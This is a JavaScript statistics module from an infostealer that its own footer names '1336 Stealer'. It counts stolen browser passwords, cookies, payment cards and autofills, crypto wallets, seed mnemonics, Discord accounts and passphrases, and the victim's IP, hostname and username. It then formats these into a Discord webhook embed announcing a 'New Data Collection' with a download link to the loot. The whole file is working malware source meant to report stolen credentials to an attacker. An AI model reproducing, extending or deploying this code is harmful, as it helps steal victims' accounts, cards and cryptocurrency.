/**
 * Statistics Management System
 * Handles collection and formatting of application statistics
 */

const { logger } = require('../core/logger');

class Statistics {
    constructor() {
        this.reset();
    }

    /**
     * Reset all statistics
     */
    reset() {
        this.data = {
            browsers: {
                passwords: 0,
                cookies: 0,
                autofills: 0,
                cards: 0,
                history: 0,
                downloads: 0,
                bookmarks: 0
            },
            collections: {
                games: [],
                exodus: [],
                keywordPasswords: [],
                vpn: [],
                sysadmin: [],
                extensions: [],
                colds: [],
                mnemonics: [],
                messengers: [],
                files: []
            },
            system: {
                ip: null,
                hostname: null,
                username: null,
                timestamp: new Date().toISOString()
            },
            discord: {
                accounts: [],
                passphrases: []
            }
        };
    }

    /**
     * Add browser statistics
     * @param {Object} browserData - Browser data object
     */
    addBrowser(browserData) {
        const { passwords, cookies, autofills, cards, history, downloads, bookmarks } = browserData;
        
        this.data.browsers.passwords += passwords || 0;
        this.data.browsers.cookies += cookies || 0;
        this.data.browsers.autofills += autofills || 0;
        this.data.browsers.cards += cards || 0;
        this.data.browsers.history += history || 0;
        this.data.browsers.downloads += downloads || 0;
        this.data.browsers.bookmarks += bookmarks || 0;
        
        logger.debug('Browser statistics updated', browserData);
    }

    /**
     * Add item to a collection
     * @param {string} collection - Collection name
     * @param {any} item - Item to add
     */
    addToCollection(collection, item) {
        if (this.data.collections[collection]) {
            this.data.collections[collection].push(item);
            logger.debug(`Added item to ${collection} collection`, { item });
        } else {
            logger.warn(`Unknown collection: ${collection}`);
        }
    }

    /**
     * Add game to collection
     * @param {string} name - Game name
     */
    addGame(name) {
        this.addToCollection('games', name);
    }

    /**
     * Add exodus wallet to collection
     * @param {string} name - Wallet name
     */
    addExodus(name) {
        this.addToCollection('exodus', name);
    }

    /**
     * Add keyword password to collection
     * @param {string} keyword - Keyword
     */
    addKeywordPassword(keyword) {
        this.addToCollection('keywordPasswords', keyword);
    }

    /**
     * Add VPN to collection
     * @param {string} name - VPN name
     */
    addVpn(name) {
        this.addToCollection('vpn', name);
    }

    /**
     * Add sysadmin tool to collection
     * @param {string} name - Tool name
     */
    addSysadmin(name) {
        this.addToCollection('sysadmin', name);
    }

    /**
     * Add extension to collection
     * @param {string} name - Extension name
     */
    addExtension(name) {
        this.addToCollection('extensions', name);
    }

    /**
     * Add cold wallet to collection
     * @param {string} name - Cold wallet name
     */
    addCold(name) {
        this.addToCollection('colds', name);
    }

    /**
     * Add mnemonic to collection
     * @param {string} mnemonic - Mnemonic phrase
     */
    addMnemonic(mnemonic) {
        this.addToCollection('mnemonics', mnemonic);
    }

    /**
     * Add messenger to collection
     * @param {string} name - Messenger name
     */
    addMessenger(name) {
        this.addToCollection('messengers', name);
    }

    /**
     * Add file to collection
     * @param {string} name - File name
     */
    addFile(name) {
        this.addToCollection('files', name);
    }

    /**
     * Add Discord account
     * @param {Object} account - Discord account data
     */
    addDiscordAccount(account) {
        this.data.discord.accounts.push(account);
        logger.debug('Discord account added to statistics');
    }

    /**
     * Add passphrase
     * @param {string} passphrase - Passphrase
     */
    addPassphrase(passphrase) {
        if (passphrase && !this.data.discord.passphrases.includes(passphrase)) {
            this.data.discord.passphrases.push(passphrase);
            logger.debug('Passphrase added to statistics');
        }
    }

    /**
     * Set system information
     * @param {Object} systemInfo - System information
     */
    setSystemInfo(systemInfo) {
        this.data.system = {
            ...this.data.system,
            ...systemInfo,
            timestamp: new Date().toISOString()
        };
        logger.debug('System information updated', systemInfo);
    }

    /**
     * Get formatted statistics for display/sending
     * @returns {Object} Formatted statistics
     */
    getFormattedStats() {
        return {
            summary: {
                totalPasswords: this.data.browsers.passwords,
                totalCookies: this.data.browsers.cookies,
                totalGames: this.data.collections.games.length,
                totalWallets: this.data.collections.exodus.length + this.data.collections.colds.length,
                totalDiscordAccounts: this.data.discord.accounts.length,
                timestamp: this.data.system.timestamp
            },
            browsers: this.data.browsers,
            collections: this.data.collections,
            system: this.data.system,
            discord: {
                accountCount: this.data.discord.accounts.length,
                hasPassphrases: this.data.discord.passphrases.length > 0
            }
        };
    }

    /**
     * Build Discord webhook payload
     * @param {string} username - Username
     * @param {string} hostname - Hostname
     * @param {string} ip - IP address
     * @param {string} link - Optional file link
     * @returns {string} JSON payload
     */
    buildWebhookPayload(username, hostname, ip, link = '') {
        const stats = this.getFormattedStats();
        
        const embed = {
            title: '🔥 1336 | New Data Collection',
            color: 0x0099ff,
            fields: [
                {
                    name: '💻 System Information',
                    value: `**Username:** ${username}\n**Hostname:** ${hostname}\n**IP:** ${ip}`,
                    inline: false
                },
                {
                    name: '🌐 Browser Data',
                    value: `**Passwords:** ${stats.browsers.passwords}\n**Cookies:** ${stats.browsers.cookies}\n**Cards:** ${stats.browsers.cards}`,
                    inline: true
                },
                {
                    name: '🎮 Games & Applications',
                    value: `**Games:** ${stats.collections.games.length}\n**Messengers:** ${stats.collections.messengers.length}\n**VPNs:** ${stats.collections.vpn.length}`,
                    inline: true
                },
                {
                    name: '💰 Cryptocurrency',
                    value: `**Wallets:** ${stats.collections.exodus.length + stats.collections.colds.length}\n**Extensions:** ${stats.collections.extensions.length}\n**Mnemonics:** ${stats.collections.mnemonics.length}`,
                    inline: true
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: '1336 Stealer | github.com/Ayhuuu'
            }
        };

        if (link) {
            embed.fields.push({
                name: '📁 Download Link',
                value: `[Click here to download](${link})`,
                inline: false
            });
        }

        if (stats.discord.accountCount > 0) {
            embed.fields.push({
                name: '💬 Discord',
                value: `**Accounts:** ${stats.discord.accountCount}`,
                inline: true
            });
        }

        return JSON.stringify({
            embeds: [embed]
        });
    }

    /**
     * Get raw statistics data
     * @returns {Object} Raw statistics data
     */
    getRawData() {
        return { ...this.data };
    }

    /**
     * Export statistics to JSON
     * @returns {string} JSON string of statistics
     */
    exportToJson() {
        return JSON.stringify(this.data, null, 2);
    }
}

// Create and export singleton instance
const stats = new Statistics();

module.exports = {
    Statistics,
    stats
};